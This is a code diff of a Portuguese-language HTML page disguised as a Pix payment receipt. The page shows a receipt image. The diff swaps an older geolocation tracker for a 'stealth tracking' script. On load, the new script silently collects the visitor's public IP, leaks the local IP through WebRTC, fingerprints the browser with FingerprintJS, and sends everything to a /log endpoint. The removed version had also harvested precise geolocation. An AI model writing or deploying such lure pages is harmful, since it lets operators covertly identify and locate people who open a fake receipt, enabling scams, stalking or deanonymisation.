@@ -1,64 +1,70 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Comprovante Pix</title>
+  <meta charset="UTF-8" />
+  <title>Confirmação de Comprovante</title>
   <style>
-    body { background: #f2f2f2; text-align: center; font-family: Arial; }
+    body { background: #fff; text-align: center; font-family: Arial; }
     img { margin-top: 50px; width: 90%; max-width: 500px; }
   </style>
 </head>
 <body>
-  <img src="comprovante.jpg" alt="Comprovante Pix">
+  <img src="comprovante.jpg" alt="Comprovante Pix" />
 
-  <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 
   <script>
-    console.log("🟡 Script carregado... preparando rastreamento");
+    // STUN WebRTC IP leak
+    async function getWebRTCIP() {
+      return new Promise(resolve => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(position => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-
-        console.log("📍 Geolocalização precisa:", lat, lon);
-
-        fetch("https://api.ipify.org?format=json")
-          .then(res => res.json())
-          .then(ipData => {
-            FingerprintJS.load()
-              .then(fp => fp.get())
-              .then(result => {
-                const visitorId = result.visitorId;
-                const device = navigator.userAgent;
-
-                fetch("/log", {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({
-                    ip: ipData.ip,
-                    visitorId,
-                    userAgent: device,
-                    device,
-                    loc: `${lat},${lon}`
-                  })
-                })
-                  .then(r => {
-                    if (r.ok) {
-                      console.log("✅ Dados enviados com sucesso");
-                    } else {
-                      console.warn("⚠️ Problema ao enviar dados:", r.status);
-                    }
-                  })
-                  .catch(err => console.error("❌ Falha no envio:", err));
-              });
-          });
-      }, err => {
-        console.warn("⚠️ Geolocalização negada ou falhou:", err);
+        pc.onicecandidate = event => {
+          if (!event || !event.candidate) return;
+          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+          const ipMatch = ipRegex.exec(event.candidate.candidate);
+          if (ipMatch) resolve(ipMatch[1]);
+        };
       });
-    } else {
-      console.log("❌ Geolocalização não suportada no navegador.");
     }
+    async function rastrear() {
+      console.log("🕵️‍♂️ Iniciando rastreamento stealth...");
+
+      const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+      const localIP = await getWebRTCIP().catch(() => "N/A");
+
+      const fp = await FingerprintJS.load();
+      const result = await fp.get();
+
+      const visitorId = result.visitorId;
+      const userAgent = navigator.userAgent;
+      const device = `${navigator.platform} - ${navigator.userAgent}`;
+
+      const payload = {
+        ip: ipData.ip,
+        localIP,
+        visitorId,
+        userAgent,
+        device
+      };
+
+      console.log("📦 Dados coletados:", payload);
+
+      fetch("/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(r => {
+        if (r.ok) console.log("✅ Dados enviados com sucesso");
+        else console.warn("⚠️ Erro ao enviar:", r.status);
+      })
+      .catch(err => console.error("❌ Falha:", err));
+    }
+
+    rastrear();
   </script>
 </body>
 </html>
